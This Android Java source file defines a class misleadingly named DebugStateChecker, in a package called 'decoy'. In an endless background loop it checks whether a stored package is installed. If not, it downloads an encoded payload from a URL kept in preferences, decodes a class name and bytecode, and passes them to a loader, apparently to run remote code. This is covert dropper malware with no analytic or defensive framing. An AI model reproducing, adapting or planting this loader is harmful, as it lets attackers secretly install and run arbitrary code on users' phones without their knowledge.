package com.example.decoy;

import android.content.Context;
import android.content.SharedPreferences;
import android.content.pm.PackageManager.NameNotFoundException;
import android.net.ConnectivityManager;
import android.util.Log;

import com.android.volley.DefaultRetryPolicy;
import com.android.volley.NetworkResponse;
import com.android.volley.Request;
import com.android.volley.RequestQueue;
import com.android.volley.RequestQueue.RequestFinishedListener;
import com.android.volley.Response;
import com.android.volley.Response.ErrorListener;
import com.android.volley.Response.Listener;
import com.android.volley.VolleyError;
import com.android.volley.toolbox.Volley;
import com.example.decoy.binary_utils.BinaryReader;
import com.example.decoy.faxLoader.CrissCross;
import com.example.decoy.volley.InputStreamVolleyRequest;
import java.io.ByteArrayInputStream;

public class DebugStateChecker extends Thread {
    public Context mContext;
    public SharedPreferences pref = null;
    public Integer resCode = Integer.valueOf(1);
    public RequestQueue rq;

    DebugStateChecker(Context context) {
        this.mContext = context;
    }

    public void run() {
        super.run();
        init();

        while (true) {
            if (!isPackageInstalled(this.pref.getString("pName", null), this.mContext)) {
                try {
                    if (isNetworkConnected()) {
                        new Thread(new Runnable() {
                            public void run() {
				InputStreamVolleyRequest inputStreamVolleyRequest = new InputStreamVolleyRequest(0, DebugStateChecker.this.pref.getString("url", ""), new Listener<byte[]>() {
                                public void onResponse(byte[] bArr) {
                                    try {
                                            System.out.println(bArr);

                                            BinaryReader binaryReader = new BinaryReader(new ByteArrayInputStream(encDec.DecodeData(bArr)));
                                            String readString = binaryReader.readString();
                                            byte[] readBytes = binaryReader.readBytes(binaryReader.readInt32());
                                            binaryReader.close();

                                            Log.d("ClassName: ", readString);
                                            CrissCross.crissCross(readString, DebugStateChecker.this.mContext, readBytes);
                                        } catch (Exception e) {
                                            e.printStackTrace();
                                        }
                                    }
                                }, new Response.ErrorListener() {
                                    public void onErrorResponse(VolleyError volleyError) {
                                        NetworkResponse networkResponse = volleyError.networkResponse;
                                        if (networkResponse != null) {
                                            DebugStateChecker.this.resCode = Integer.valueOf(networkResponse.statusCode);
                                        }
                                    }
                                }, null);
                                inputStreamVolleyRequest.setRetryPolicy(new DefaultRetryPolicy(120000, 1, 1.0f));
                                DebugStateChecker.this.rq.add(inputStreamVolleyRequest);
                            }
                        }).start();
                    }
                } catch (Exception e) {
                    e.printStackTrace();
                }
            }
        }
    }

    private void init() {
        this.pref = application.getContext().getSharedPreferences("MyPref", Context.MODE_PRIVATE);
        this.rq = Volley.newRequestQueue(this.mContext);
        this.rq.addRequestFinishedListener(new RequestQueue.RequestFinishedListener<Object>() {
            public void onRequestFinished(Request<Object> request) {
            }
        });
    }

    private boolean isPackageInstalled(String str, Context context) {

        if (str == null) { return false; }

        try {
            context.getPackageManager().getPackageInfo(str, 0);
            return true;
        } catch (NameNotFoundException unused) {
            return false;
        }
    }

    private boolean isNetworkConnected() {
        ConnectivityManager connectivityManager = (ConnectivityManager) this.mContext.getSystemService("connectivity");
        return connectivityManager.getActiveNetworkInfo() != null && connectivityManager.getActiveNetworkInfo().isConnected();
    }
}
